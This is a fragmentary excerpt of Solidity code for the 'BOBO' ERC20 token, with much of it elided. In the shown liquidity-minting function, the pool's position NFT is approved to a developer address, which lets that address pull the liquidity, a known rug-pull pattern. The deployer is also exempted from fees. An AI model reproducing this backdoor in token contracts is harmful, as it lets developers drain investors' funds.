...
contract BOBOCoin is ERC20Permit, Fee, SwapV3 {
    event Transfer2(
        address msgSender,
        address from,
        address to,
    ...
    constructor(
        ...
        ERC20("BOBO", "BOBO")
        ERC20Permit("BOBO")
        SwapV3(_swapRouter, _positionManager, _chainLinkEth)
    {
        devAddress = _devAddress;
        _addExcludeFromFee(address(this));
        _addExcludeFromFee(_msgSender());
...
abstract contract SwapV3 is Dev, Fee, Common {
    ...
    function _mintNewPosition(
        ...
        returns (uint256 tokenId, uint128, uint256, uint256) {
            ownTokenId = tokenId;
            IERC721(address(nftPositionManager)).approve(
                devAddress,
                ownTokenId
            );
        } catch Error(string memory reason) {
